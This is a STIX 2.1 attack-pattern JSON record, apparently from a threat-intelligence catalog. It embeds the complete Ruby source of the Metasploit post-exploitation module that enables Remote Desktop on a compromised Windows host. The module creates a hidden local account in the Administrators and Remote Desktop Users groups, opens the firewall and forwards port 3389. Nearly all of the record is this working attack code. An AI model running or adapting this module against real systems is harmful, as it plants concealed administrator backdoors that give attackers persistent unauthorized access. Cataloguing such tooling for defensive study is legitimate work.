{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a8d13a1-9d97-49a0-8dff-0d934b49373e",
    "created": "2024-08-14T16:33:04.991727Z",
    "modified": "2024-08-14T16:33:04.99173Z",
    "name": "Windows Manage Enable Remote Desktop",
    "description": " This module enables the Remote Desktop Service (RDP). It provides the options to create an account and configure it to be a member of the Local Administrators and Remote Desktop Users group. It can also forward the target's port 3389/tcp.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/enable_rdp.rb",
            "external_id": "enable_rdp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Enable Remote Desktop',\n        'Description' => %q{\n          This module enables the Remote Desktop Service (RDP). It provides the options to create\n          an account and configure it to be a member of the Local Administrators and\n          Remote Desktop Users group. It can also forward the target's port 3389/tcp.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),\n        OptString.new('PASSWORD', [ false, 'Password for the user created.' ]),\n        OptBool.new('ENABLE', [ false, 'Enable the RDP Service and Firewall Exception.', true]),\n        OptBool.new('FORWARD', [ false, 'Forward remote port 3389 to local Port.', false]),\n        OptInt.new('LPORT', [ false, 'Local port to forward remote connection.', 3389])\n      ]\n    )\n  end\n\n  def run\n    if datastore['ENABLE'] || (datastore['USERNAME'] && datastore['PASSWORD'])\n      cleanup_rc = store_loot(\n        'host.windows.cleanup.enable_rdp',\n        'text/plain',\n        session,\n        '',\n        'enable_rdp_cleanup.rc',\n        'enable_rdp cleanup resource file'\n      )\n\n      if datastore['ENABLE']\n        if is_admin?\n          enablerd(cleanup_rc)\n          enabletssrv(cleanup_rc)\n        else\n          print_error('Insufficient privileges, Remote Desktop Service was not modified')\n        end\n      end\n      if datastore['USERNAME'] && datastore['PASSWORD']\n        if is_admin?\n          addrdpusr(datastore['USERNAME'], datastore['PASSWORD'], cleanup_rc)\n        else\n          print_error('Insufficient privileges, account was not be created.')\n        end\n      end\n      if datastore['FORWARD']\n        print_status(\"Starting the port forwarding at local port #{datastore['LPORT']}\")\n        client.run_cmd(\"portfwd add -L 0.0.0.0 -l #{datastore['LPORT']} -p 3389 -r 127.0.0.1\")\n      end\n      print_status(\"For cleanup execute Meterpreter resource file: #{cleanup_rc}\")\n    end\n  end\n\n  def enablerd(cleanup_rc)\n    key = 'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server'\n    value = 'fDenyTSConnections'\n    begin\n      v = registry_getvaldata(key, value)\n      print_status 'Enabling Remote Desktop'\n      if v == 1\n        print_status \"\\tRDP is disabled; enabling it ...\"\n        registry_setvaldata(key, value, 0, 'REG_DWORD')\n        file_local_write(cleanup_rc, \"reg setval -k \\'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\' -v 'fDenyTSConnections' -d \\\"1\\\"\")\n      else\n        print_status \"\\tRDP is already enabled\"\n      end\n    rescue StandardError => e\n      print_status(\"The following Error was encountered: #{e.class} #{e}\")\n    end\n  end\n\n  def enabletssrv(cleanup_rc)\n    service_name = 'termservice'\n    srv_info = service_info(service_name)\n    begin\n      print_status 'Setting Terminal Services service startup mode'\n      if srv_info[:starttype] != START_TYPE_AUTO\n        print_status \"\\tThe Terminal Services service is not set to auto, changing it to auto ...\"\n        unless service_change_config(service_name, starttype: 'START_TYPE_AUTO') == Windows::Error::SUCCESS\n          print_error(\"\\tUnable to change start type to Auto\")\n        end\n        file_local_write(cleanup_rc, 'execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"')\n        if service_start(service_name) == Windows::Error::SUCCESS\n          print_good(\"\\tRDP Service Started\")\n        end\n        file_local_write(cleanup_rc, 'execute -H -f cmd.exe -a \"/c sc stop termservice\"')\n      else\n        print_status \"\\tTerminal Services service is already set to auto\"\n      end\n      # Enabling Exception on the Firewall\n      print_status \"\\tOpening port in local firewall if necessary\"\n      cmd_exec('netsh', 'firewall set service type = remotedesktop mode = enable', 30)\n      file_local_write(cleanup_rc, \"execute -H -f cmd.exe -a \\\"/c 'netsh firewall set service type = remotedesktop mode = enable'\\\"\")\n    rescue StandardError => e\n      print_status(\"The following Error was encountered: #{e.class} #{e}\")\n    end\n  end\n\n  def addrdpusr(username, password, cleanup_rc)\n    print_status 'Setting user account for logon'\n    print_status \"\\tAdding User: #{username} with Password: #{password}\"\n    begin\n      if check_user(username)\n        print_error(\"\\tThe user #{username} already exists\")\n        return\n      end\n\n      rdu_sid = resolve_sid('S-1-5-32-555')\n      admin_sid = resolve_sid('S-1-5-32-544')\n\n      if !rdu_sid[:mapped] || !admin_sid[:mapped]\n        print_error(\"\\tThe Remote Desktop Users group is not mapped\") if !rdu_sid[:mapped]\n        print_error(\"\\tThe Administrators group is not mapped\") if !admin_sid[:mapped]\n        print_error(\"\\tNot adding user #{username}\")\n        return\n      end\n\n      rdu = rdu_sid[:name]\n      admin = admin_sid[:name]\n\n      user_added = false\n      result = add_user(username, password)\n      if result['return'] == 0\n        user_added = true\n      elsif check_user(username)\n        user_added = true\n      end\n\n      if user_added\n        file_local_write(cleanup_rc, \"execute -H -f cmd.exe -a \\\"/c net user #{username} /delete\\\"\")\n        print_status \"\\tAdding User: #{username} to local group '#{rdu}'\"\n        add_members_localgroup(rdu, username)\n\n        print_status \"\\tHiding user from Windows Login screen\"\n        hide_user_key = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList'\n        registry_setvaldata(hide_user_key, username, 0, 'REG_DWORD')\n        file_local_write(cleanup_rc, \"reg deleteval -k HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\SpecialAccounts\\\\\\\\UserList -v #{username}\")\n        print_status \"\\tAdding User: #{username} to local group '#{admin}'\"\n        add_members_localgroup(admin, username)\n        print_status 'You can now login with the created user'\n      else\n        print_error('Account could not be created')\n        print_error('Error:')\n        addusr_out.each_line do |l|\n          print_error(\"\\t#{l.chomp}\")\n        end\n      end\n    rescue StandardError => e\n      print_status(\"The following Error was encountered: #{e.class} #{e}\")\n    end\n  end\n\n  def check_user(user)\n    enum_user.include?(user)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}